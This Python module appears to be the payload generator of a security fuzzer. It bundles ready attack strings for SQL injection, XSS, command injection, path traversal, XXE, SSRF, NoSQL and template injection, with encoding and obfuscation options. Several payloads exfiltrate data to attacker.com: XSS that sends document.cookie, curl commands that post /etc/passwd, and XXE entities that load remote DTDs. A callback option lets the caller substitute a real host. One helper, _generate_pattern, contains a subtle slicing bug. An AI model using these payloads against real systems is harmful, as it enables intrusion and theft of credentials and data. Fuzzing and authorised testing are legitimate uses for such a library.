#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Payload Generator for PhantomFuzzer.

This module provides payload generation capabilities for the PhantomFuzzer project,
including various attack vectors and payload types for security testing.
"""

import random
import string
import base64
import json
import re
from typing import Dict, List, Tuple, Union, Optional, Any, Callable

# Local imports
from phantomfuzzer.utils.logging import get_logger


class PayloadGenerator:
    """Payload generator for security testing.
    
    This class provides various payload generation capabilities for different
    attack vectors and security testing scenarios.
    """
    
    def __init__(self, config: Optional[Dict[str, Any]] = None):
        """Initialize the payload generator.
        
        Args:
            config: Configuration parameters for the payload generator.
        """
        self.logger = get_logger(__name__)
        self.config = config or {}
        
        # Payload configuration
        self.max_payload_length = self.config.get('max_payload_length', 4096)
        self.encoding_types = self.config.get('encoding_types', ['none', 'url', 'base64', 'hex'])
        self.obfuscation_level = self.config.get('obfuscation_level', 0)  # 0-3, higher means more obfuscation
        self.include_comments = self.config.get('include_comments', True)
        
        # Load custom payloads if provided
        self.custom_payloads = self.config.get('custom_payloads', {})
        
        # Initialize payload categories
        self._init_sql_injection_payloads()
        self._init_xss_payloads()
        self._init_command_injection_payloads()
        self._init_path_traversal_payloads()
        self._init_format_string_payloads()
        self._init_buffer_overflow_payloads()
        self._init_xxe_payloads()
        self._init_ssrf_payloads()
        self._init_nosql_injection_payloads()
        self._init_template_injection_payloads()
        
        self.logger.info(f"Initialized PayloadGenerator with {len(self.payload_categories)} categories")
    
    @property
    def payload_categories(self) -> List[str]:
        """Get the available payload categories.
        
        Returns:
            List of available payload categories.
        """
        return [
            'sql_injection',
            'xss',
            'command_injection',
            'path_traversal',
            'format_string',
            'buffer_overflow',
            'xxe',
            'ssrf',
            'nosql_injection',
            'template_injection'
        ]
    
    def get_payload(self, category: str, subcategory: Optional[str] = None, 
                   context: Optional[Dict[str, Any]] = None) -> str:
        """Get a payload from the specified category.
        
        Args:
            category: The category of payload to generate.
            subcategory: Optional subcategory for more specific payloads.
            context: Optional context information for payload customization.
            
        Returns:
            Generated payload as a string.
        """
        context = context or {}
        
        # Get the payload generation method
        method_name = f"_generate_{category}_payload"
        if not hasattr(self, method_name):
            self.logger.warning(f"No payload generation method for category: {category}")
            return ""
        
        # Generate the payload
        method = getattr(self, method_name)
        payload = method(subcategory, context)
        
        # Apply encoding if specified
        encoding = context.get('encoding', 'none')
        if encoding in self.encoding_types and encoding != 'none':
            payload = self._encode_payload(payload, encoding)
        
        # Apply obfuscation if specified
        if self.obfuscation_level > 0:
            payload = self._obfuscate_payload(payload, self.obfuscation_level)
        
        # Truncate if necessary
        if len(payload) > self.max_payload_length:
            payload = payload[:self.max_payload_length]
        
        return payload
    
    def get_random_payload(self, context: Optional[Dict[str, Any]] = None) -> str:
        """Get a random payload from any category.
        
        Args:
            context: Optional context information for payload customization.
            
        Returns:
            Randomly generated payload as a string.
        """
        category = random.choice(self.payload_categories)
        return self.get_payload(category, None, context)
    
    def get_multiple_payloads(self, category: str, count: int, 
                           context: Optional[Dict[str, Any]] = None) -> List[str]:
        """Get multiple payloads from the specified category.
        
        Args:
            category: The category of payloads to generate.
            count: Number of payloads to generate.
            context: Optional context information for payload customization.
                     Can include a 'subcategory' key to specify the subcategory.
            
        Returns:
            List of generated payloads.
        """
        context = context or {}
        subcategory = context.get('subcategory')
        
        payloads = []
        for _ in range(count):
            payloads.append(self.get_payload(category, subcategory, context))
        return payloads
    
    def _encode_payload(self, payload: str, encoding_type: str) -> str:
        """Encode the payload using the specified encoding type.
        
        Args:
            payload: The payload to encode.
            encoding_type: The type of encoding to apply.
            
        Returns:
            Encoded payload as a string.
        """
        if encoding_type == 'url':
            import urllib.parse
            return urllib.parse.quote(payload)
        elif encoding_type == 'base64':
            return base64.b64encode(payload.encode()).decode()
        elif encoding_type == 'hex':
            return payload.encode().hex()
        else:
            return payload
    
    def _obfuscate_payload(self, payload: str, level: int) -> str:
        """Obfuscate the payload based on the specified level.
        
        Args:
            payload: The payload to obfuscate.
            level: The level of obfuscation to apply (0-3).
            
        Returns:
            Obfuscated payload as a string.
        """
        if level <= 0:
            return payload
        
        # Apply different obfuscation techniques based on level
        if level == 1:
            # Basic character substitution
            payload = payload.replace('a', 'a\u0000')
            payload = payload.replace(' ', '\t')
        elif level == 2:
            # Add random comments and whitespace
            if '<' in payload and '>' in payload:
                # HTML/XML context
                payload = re.sub(r'(<[^>]+>)', r'\1<!-- random -->', payload)
            else:
                # Other contexts
                payload = re.sub(r'([\s;])', r'\1/* random */', payload)
        elif level >= 3:
            # Advanced obfuscation
            # For example, in SQL context, use char() function
            if any(keyword in payload.lower() for keyword in ['select', 'union', 'from', 'where']):
                # Likely SQL context
                for char in string.ascii_letters:
                    if char in payload:
                        payload = payload.replace(char, f"char({ord(char)})")
        
        return payload
    
    # Payload Initialization Methods
    
    def _init_sql_injection_payloads(self):
        """Initialize SQL injection payloads."""
        self.sql_injection_payloads = {
            'basic': [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
                "\" OR \"1\"=\"1",
                "\" OR \"1\"=\"1\" --",
                "' OR 1=1 --",
                "admin'--",
                "' UNION SELECT 1,2,3 --",
                "' UNION SELECT username,password,3 FROM users --"
            ],
            'error_based': [
                "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e)) --",
                "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT database()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
                "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT user()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --"
            ],
            'blind': [
                "' OR (SELECT SUBSTR(username,1,1) FROM users WHERE id=1)='a' --",
                "' OR (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a' --",
                "' OR IF((SELECT SUBSTR(username,1,1) FROM users WHERE id=1)='a',SLEEP(5),0) --",
                "' OR IF((SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a',SLEEP(5),0) --"
            ],
            'time_based': [
                "' OR SLEEP(5) --",
                "' OR BENCHMARK(10000000,MD5('A')) --",
                "' OR IF(1=1,SLEEP(5),0) --",
                "\" OR pg_sleep(5) --",
                "'; WAITFOR DELAY '0:0:5' --"
            ]
        }
    
    def _init_xss_payloads(self):
        """Initialize XSS payloads."""
        self.xss_payloads = {
            'basic': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')>"
            ],
            'attribute': [
                "\" onerror=alert('XSS') \"",
                "\" onmouseover=alert('XSS') \"",
                "\" onfocus=alert('XSS') \"",
                "\" onload=alert('XSS') \""
            ],
            'dom': [
                "<script>document.getElementById('vulnerable').innerHTML=location.hash.substring(1)</script>",
                "<script>eval(location.hash.substring(1))</script>",
                "<script>document.write('<img src=x onerror=alert(1)>')</script>"
            ],
            'advanced': [
                "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
                "<script>var i=new Image();i.src='https://attacker.com/steal?cookie='+document.cookie</script>",
                "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
                "<math><maction actiontype=statusline xlink:href=javascript:alert('XSS')>Click"
            ]
        }
    
    def _init_command_injection_payloads(self):
        """Initialize command injection payloads."""
        self.command_injection_payloads = {
            'basic': [
                "; ls -la",
                "| ls -la",
                "& ls -la",
                "&& ls -la",
                "|| ls -la",
                "$(ls -la)",
                "`ls -la`"
            ],
            'blind': [
                "; ping -c 5 attacker.com",
                "| ping -c 5 attacker.com",
                "& ping -c 5 attacker.com",
                "&& ping -c 5 attacker.com",
                "|| ping -c 5 attacker.com",
                "$(ping -c 5 attacker.com)",
                "`ping -c 5 attacker.com`"
            ],
            'data_exfiltration': [
                "; curl -d \"data=$(cat /etc/passwd)\" https://attacker.com",
                "| curl -d \"data=$(cat /etc/passwd)\" https://attacker.com",
                "& curl -d \"data=$(cat /etc/passwd)\" https://attacker.com",
                "&& curl -d \"data=$(cat /etc/passwd)\" https://attacker.com",
                "|| curl -d \"data=$(cat /etc/passwd)\" https://attacker.com"
            ],
            'windows': [
                "; dir",
                "| dir",
                "& dir",
                "&& dir",
                "|| dir",
                "$(dir)",
                "`dir`"
            ]
        }
    
    def _init_path_traversal_payloads(self):
        """Initialize path traversal payloads."""
        self.path_traversal_payloads = {
            'basic': [
                "../../../etc/passwd",
                "../../../../etc/passwd",
                "../../../../../etc/passwd",
                "../../../../../../etc/passwd",
                "../../../../../../../etc/passwd"
            ],
            'encoded': [
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
                "..%2f..%2f..%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd"
            ],
            'windows': [
                "..\\..\\..\\windows\\win.ini",
                "..\\..\\..\\..\\windows\\win.ini",
                "..\\..\\..\\..\\..\\windows\\win.ini",
                "..\\..\\..\\..\\..\\..\\windows\\win.ini"
            ],
            'null_byte': [
                "../../../etc/passwd%00",
                "../../../etc/passwd\0",
                "../../../etc/passwd%00.jpg",
                "../../../etc/passwd\0.jpg"
            ]
        }
    
    def _init_format_string_payloads(self):
        """Initialize format string payloads."""
        self.format_string_payloads = {
            'basic': [
                "%s%s%s%s%s%s%s%s%s%s",
                "%x%x%x%x%x%x%x%x%x%x",
                "%n%n%n%n%n%n%n%n%n%n",
                "%d%d%d%d%d%d%d%d%d%d"
            ],
            'advanced': [
                "%p%p%p%p%p%p%p%p%p%p",
                "%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p",
                "%08x.%08x.%08x.%08x.%08x",
                "%8x.%8x.%8x.%8x.%8x"
            ],
            'memory_read': [
                "%s%s%s%s%s%s%s%s%s%s",
                "%x%x%x%x%x%x%x%x%x%x",
                "%100$s",
                "%200$s"
            ]
        }
    
    def _init_buffer_overflow_payloads(self):
        """Initialize buffer overflow payloads."""
        self.buffer_overflow_payloads = {
            'basic': [
                "A" * 100,
                "A" * 500,
                "A" * 1000,
                "A" * 5000
            ],
            'pattern': [
                self._generate_pattern(100),
                self._generate_pattern(500),
                self._generate_pattern(1000),
                self._generate_pattern(5000)
            ],
            'shellcode': [
                "\x90" * 30 + "\xcc" * 4 + "\x90" * 30,  # NOP sled + INT3 + NOP sled
                "\x90" * 50 + "\xcc" * 4 + "\x90" * 50,  # NOP sled + INT3 + NOP sled
                "\x90" * 100 + "\xcc" * 4 + "\x90" * 100  # NOP sled + INT3 + NOP sled
            ]
        }
    
    def _init_xxe_payloads(self):
        """Initialize XXE payloads."""
        self.xxe_payloads = {
            'basic': [
                "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>&xxe;</foo>",
                "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>"
            ],
            'remote': [
                "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"http://attacker.com/evil.dtd\">]><foo>&xxe;</foo>",
                "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]><foo>Triggered</foo>"
            ],
            'blind': [
                "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY % xxe SYSTEM \"file:///etc/passwd\"><!ENTITY % load SYSTEM \"http://attacker.com/?%xxe;\">%load;]><foo>Triggered</foo>"
            ]
        }
    
    def _init_ssrf_payloads(self):
        """Initialize SSRF payloads."""
        self.ssrf_payloads = {
            'basic': [
                "http://localhost/admin",
                "http://127.0.0.1/admin",
                "http://[::1]/admin",
                "http://0.0.0.0/admin"
            ],
            'internal_services': [
                "http://localhost:22",
                "http://localhost:3306",
                "http://localhost:5432",
                "http://localhost:6379",
                "http://localhost:27017",
                "http://localhost:8080",
                "http://localhost:8443",
                "http://localhost:9200"
            ],
            'cloud_metadata': [
                "http://169.254.169.254/latest/meta-data/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://169.254.169.254/metadata/v1/"
            ],
            'file': [
                "file:///etc/passwd",
                "file:///etc/shadow",
                "file:///proc/self/environ",
                "file:///var/www/html/config.php"
            ]
        }
    
    def _init_nosql_injection_payloads(self):
        """Initialize NoSQL injection payloads."""
        self.nosql_injection_payloads = {
            'mongodb': [
                "{'$gt': ''}",
                "{'$ne': null}",
                "{'$exists': true}",
                "{'$in': [null, '', 'admin']}"
            ],
            'operator_injection': [
                "username[$ne]=admin&password[$ne]=",
                "username[$regex]=^adm&password[$ne]=",
                "username[$exists]=true&password[$exists]=true",
                "username[$in][]=admin&username[$in][]=root&password[$ne]="
            ],
            'javascript_injection': [
                "' || this.password.match(/.*/) || '",
                "'; return this.username == 'admin' && this.password.match(/.*/) || ''",
                "'; return this.username == 'admin' && this.password.match(/^password/) || ''"
            ]
        }
    
    def _init_template_injection_payloads(self):
        """Initialize template injection payloads."""
        self.template_injection_payloads = {
            'basic': [
                "{{7*7}}",
                "${7*7}",
                "<%= 7*7 %>",
                "${{7*7}}",
                "#{7*7}"
            ],
            'jinja2': [
                "{{config}}",
                "{{config.items()}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
                "{{''.__class__.__mro__[1].__subclasses__()[40]('flag.txt').read()}}",
                "{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}"
            ],
            'freemarker': [
                "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"ls\")}",
                "${\"/bin/sh -c ls\"?eval}",
                "<#assign classloader=object?api.class.protectionDomain.classLoader><#assign owc=classloader.loadClass(\"freemarker.template.ObjectWrapper\")><#assign dwf=owc.getField(\"DEFAULT_WRAPPER\").get(null)><#assign ec=classloader.loadClass(\"freemarker.template.utility.Execute\")>${dwf.newInstance(ec,null)(\"id\")}"
            ],
            'velocity': [
                "#set($x = \"$class.inspect(\"java.lang.Runtime\").getRuntime().exec(\"ls\")\")$x",
                "#set($str=$class.inspect(\"java.lang.String\").type)#set($chr=$class.inspect(\"java.lang.Character\").type)#set($ex=$class.inspect(\"java.lang.Runtime\").getRuntime().exec(\"ls\"))"
            ]
        }
    
    # Helper Methods
    
    def _generate_pattern(self, length: int) -> str:
        """Generate a cyclic pattern for buffer overflow testing.
        
        Args:
            length: Length of the pattern to generate.
            
        Returns:
            Generated pattern as a string.
        """
        pattern = ""
        for upper in string.ascii_uppercase:
            for lower in string.ascii_lowercase:
                for digit in string.digits:
                    pattern += upper + lower + digit
                    if len(pattern) >= length:
                        return pattern[:length]
        
        # If pattern is not long enough, repeat it
        return pattern * (length // len(pattern) + 1)[:length]
    
    def _generate_random_string(self, length: int, charset: str = None) -> str:
        """Generate a random string of specified length.
        
        Args:
            length: Length of the string to generate.
            charset: Character set to use. If None, uses alphanumeric characters.
            
        Returns:
            Generated random string.
        """
        charset = charset or string.ascii_letters + string.digits
        return ''.join(random.choice(charset) for _ in range(length))
    
    # Payload Generation Methods
    
    def _generate_sql_injection_payload(self, subcategory: Optional[str] = None, 
                                     context: Optional[Dict[str, Any]] = None) -> str:
        """Generate SQL injection payload.
        
        Args:
            subcategory: Subcategory of SQL injection payload.
            context: Context information for payload customization.
            
        Returns:
            Generated SQL injection payload.
        """
        context = context or {}
        
        # Get available subcategories
        subcategories = list(self.sql_injection_payloads.keys())
        
        # If subcategory is not specified or invalid, choose a random one
        if subcategory not in subcategories:
            subcategory = random.choice(subcategories)
        
        # Get payloads for the subcategory
        payloads = self.sql_injection_payloads[subcategory]
        
        # Choose a random payload
        payload = random.choice(payloads)
        
        # Customize payload if needed
        if 'table_name' in context:
            payload = payload.replace('users', context['table_name'])
        if 'column_name' in context:
            payload = payload.replace('username', context['column_name'])
        
        return payload
    
    def _generate_xss_payload(self, subcategory: Optional[str] = None, 
                           context: Optional[Dict[str, Any]] = None) -> str:
        """Generate XSS payload.
        
        Args:
            subcategory: Subcategory of XSS payload.
            context: Context information for payload customization.
            
        Returns:
            Generated XSS payload.
        """
        context = context or {}
        
        # Get available subcategories
        subcategories = list(self.xss_payloads.keys())
        
        # If subcategory is not specified or invalid, choose a random one
        if subcategory not in subcategories:
            subcategory = random.choice(subcategories)
        
        # Get payloads for the subcategory
        payloads = self.xss_payloads[subcategory]
        
        # Choose a random payload
        payload = random.choice(payloads)
        
        # Customize payload if needed
        if 'alert_message' in context:
            payload = payload.replace('XSS', context['alert_message'])
        if 'callback_url' in context:
            payload = payload.replace('https://attacker.com', context['callback_url'])
        
        return payload
    
    def _generate_command_injection_payload(self, subcategory: Optional[str] = None, 
                                         context: Optional[Dict[str, Any]] = None) -> str:
        """Generate command injection payload.
        
        Args:
            subcategory: Subcategory of command injection payload.
            context: Context information for payload customization.
            
        Returns:
            Generated command injection payload.
        """
        context = context or {}
        
        # Get available subcategories
        subcategories = list(self.command_injection_payloads.keys())
        
        # If subcategory is not specified or invalid, choose a random one
        if subcategory not in subcategories:
            subcategory = random.choice(subcategories)
        
        # Get payloads for the subcategory
        payloads = self.command_injection_payloads[subcategory]
        
        # Choose a random payload
        payload = random.choice(payloads)
        
        # Customize payload if needed
        if 'command' in context:
            if 'windows' in subcategory:
                payload = payload.replace('dir', context['command'])
            else:
                payload = payload.replace('ls -la', context['command'])
        if 'callback_url' in context:
            payload = payload.replace('attacker.com', context['callback_url'])
        
        return payload
    
    def _generate_path_traversal_payload(self, subcategory: Optional[str] = None, 
                                       context: Optional[Dict[str, Any]] = None) -> str:
        """Generate path traversal payload.
        
        Args:
            subcategory: Subcategory of path traversal payload.
            context: Context information for payload customization.
            
        Returns:
            Generated path traversal payload.
        """
        context = context or {}
        
        # Get available subcategories
        subcategories = list(self.path_traversal_payloads.keys())
        
        # If subcategory is not specified or invalid, choose a random one
        if subcategory not in subcategories:
            subcategory = random.choice(subcategories)
        
        # Get payloads for the subcategory
        payloads = self.path_traversal_payloads[subcategory]
        
        # Choose a random payload
        payload = random.choice(payloads)
        
        # Customize payload if needed
        if 'target_file' in context:
            if 'windows' in subcategory:
                payload = payload.replace('windows\\win.ini', context['target_file'])
            else:
                payload = payload.replace('etc/passwd', context['target_file'])
        
        return payload
    
    def _generate_format_string_payload(self, subcategory: Optional[str] = None, 
                                      context: Optional[Dict[str, Any]] = None) -> str:
        """Generate format string payload.
        
        Args:
            subcategory: Subcategory of format string payload.
            context: Context information for payload customization.
            
        Returns:
            Generated format string payload.
        """
        context = context or {}
        
        # Get available subcategories
        subcategories = list(self.format_string_payloads.keys())
        
        # If subcategory is not specified or invalid, choose a random one
        if subcategory not in subcategories:
            subcategory = random.choice(subcategories)
        
        # Get payloads for the subcategory
        payloads = self.format_string_payloads[subcategory]
        
        # Choose a random payload
        payload = random.choice(payloads)
        
        # Customize payload if needed
        if 'repetitions' in context:
            # Generate a format string with the specified number of repetitions
            format_specifier = '%x' if 'x' in payload else '%s' if 's' in payload else '%p'
            payload = format_specifier * context['repetitions']
        
        return payload
    
    def _generate_buffer_overflow_payload(self, subcategory: Optional[str] = None, 
                                        context: Optional[Dict[str, Any]] = None) -> str:
        """Generate buffer overflow payload.
        
        Args:
            subcategory: Subcategory of buffer overflow payload.
            context: Context information for payload customization.
            
        Returns:
            Generated buffer overflow payload.
        """
        context = context or {}
        
        # Get available subcategories
        subcategories = list(self.buffer_overflow_payloads.keys())
        
        # If subcategory is not specified or invalid, choose a random one
        if subcategory not in subcategories:
            subcategory = random.choice(subcategories)
        
        # Get payloads for the subcategory
        payloads = self.buffer_overflow_payloads[subcategory]
        
        # Choose a random payload
        payload = random.choice(payloads)
        
        # Customize payload if needed
        if 'length' in context:
            if subcategory == 'basic':
                payload = "A" * context['length']
            elif subcategory == 'pattern':
                payload = self._generate_pattern(context['length'])
            elif subcategory == 'shellcode':
                # Create a NOP sled + INT3 + NOP sled
                nop_sled_length = (context['length'] - 4) // 2
                payload = "\x90" * nop_sled_length + "\xcc" * 4 + "\x90" * nop_sled_length
        
        return payload
    
    def _generate_xxe_payload(self, subcategory: Optional[str] = None, 
                           context: Optional[Dict[str, Any]] = None) -> str:
        """Generate XXE payload.
        
        Args:
            subcategory: Subcategory of XXE payload.
            context: Context information for payload customization.
            
        Returns:
            Generated XXE payload.
        """
        context = context or {}
        
        # Get available subcategories
        subcategories = list(self.xxe_payloads.keys())
        
        # If subcategory is not specified or invalid, choose a random one
        if subcategory not in subcategories:
            subcategory = random.choice(subcategories)
        
        # Get payloads for the subcategory
        payloads = self.xxe_payloads[subcategory]
        
        # Choose a random payload
        payload = random.choice(payloads)
        
        # Customize payload if needed
        if 'target_file' in context:
            payload = payload.replace('file:///etc/passwd', f"file:///{context['target_file']}")
        if 'callback_url' in context:
            payload = payload.replace('http://attacker.com', context['callback_url'])
        
        return payload
    
    def _generate_ssrf_payload(self, subcategory: Optional[str] = None, 
                            context: Optional[Dict[str, Any]] = None) -> str:
        """Generate SSRF payload.
        
        Args:
            subcategory: Subcategory of SSRF payload.
            context: Context information for payload customization.
            
        Returns:
            Generated SSRF payload.
        """
        context = context or {}
        
        # Get available subcategories
        subcategories = list(self.ssrf_payloads.keys())
        
        # If subcategory is not specified or invalid, choose a random one
        if subcategory not in subcategories:
            subcategory = random.choice(subcategories)
        
        # Get payloads for the subcategory
        payloads = self.ssrf_payloads[subcategory]
        
        # Choose a random payload
        payload = random.choice(payloads)
        
        # Customize payload if needed
        if 'target_host' in context:
            payload = payload.replace('localhost', context['target_host'])
            payload = payload.replace('127.0.0.1', context['target_host'])
        if 'target_port' in context and 'internal_services' in subcategory:
            payload = re.sub(r':\d+', f":{context['target_port']}", payload)
        if 'target_path' in context:
            payload = re.sub(r'/[^/]*$', f"/{context['target_path']}", payload)
        
        return payload
    
    def _generate_nosql_injection_payload(self, subcategory: Optional[str] = None, 
                                       context: Optional[Dict[str, Any]] = None) -> str:
        """Generate NoSQL injection payload.
        
        Args:
            subcategory: Subcategory of NoSQL injection payload.
            context: Context information for payload customization.
            
        Returns:
            Generated NoSQL injection payload.
        """
        context = context or {}
        
        # Get available subcategories
        subcategories = list(self.nosql_injection_payloads.keys())
        
        # If subcategory is not specified or invalid, choose a random one
        if subcategory not in subcategories:
            subcategory = random.choice(subcategories)
        
        # Get payloads for the subcategory
        payloads = self.nosql_injection_payloads[subcategory]
        
        # Choose a random payload
        payload = random.choice(payloads)
        
        # Customize payload if needed
        if 'field_name' in context:
            payload = payload.replace('username', context['field_name'])
        if 'value' in context:
            payload = payload.replace('admin', context['value'])
        
        return payload
    
    def _generate_template_injection_payload(self, subcategory: Optional[str] = None, 
                                          context: Optional[Dict[str, Any]] = None) -> str:
        """Generate template injection payload.
        
        Args:
            subcategory: Subcategory of template injection payload.
            context: Context information for payload customization.
            
        Returns:
            Generated template injection payload.
        """
        context = context or {}
        
        # Get available subcategories
        subcategories = list(self.template_injection_payloads.keys())
        
        # If subcategory is not specified or invalid, choose a random one
        if subcategory not in subcategories:
            subcategory = random.choice(subcategories)
        
        # Get payloads for the subcategory
        payloads = self.template_injection_payloads[subcategory]
        
        # Choose a random payload
        payload = random.choice(payloads)
        
        # Customize payload if needed
        if 'command' in context:
            payload = payload.replace('ls', context['command'])
        if 'target_file' in context:
            payload = payload.replace('flag.txt', context['target_file'])
            payload = payload.replace('/etc/passwd', context['target_file'])
        
        return payload